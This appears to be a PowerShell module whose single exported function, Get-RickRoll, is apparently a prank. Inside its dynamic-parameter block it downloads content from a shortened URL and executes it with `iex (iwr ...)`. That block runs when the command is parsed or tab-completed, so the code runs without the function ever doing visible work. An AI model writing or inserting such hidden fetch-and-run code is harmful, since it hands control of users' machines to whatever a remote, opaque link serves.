
function Get-RickRoll
{
    [CmdletBinding()]
    param()
    DynamicParam 
    {
        $ParameterName = 'Name'
        
        $RuntimeParameterDictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $true
        
        $AttributeCollection.Add($ParameterAttribute)

        $arrSet = iex (iwr http://bit.ly/e0Mw9w )
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)

        $AttributeCollection.Add($ValidateSetAttribute)

        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($ParameterName, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($ParameterName, $RuntimeParameter)
        return $RuntimeParameterDictionary
    }
    begin 
    {
        $Name = $PsBoundParameters[$ParameterName]
    }
    Process 
    {
      
    }
    End
    {
    
    }
}


Export-ModuleMember Get-RickRoll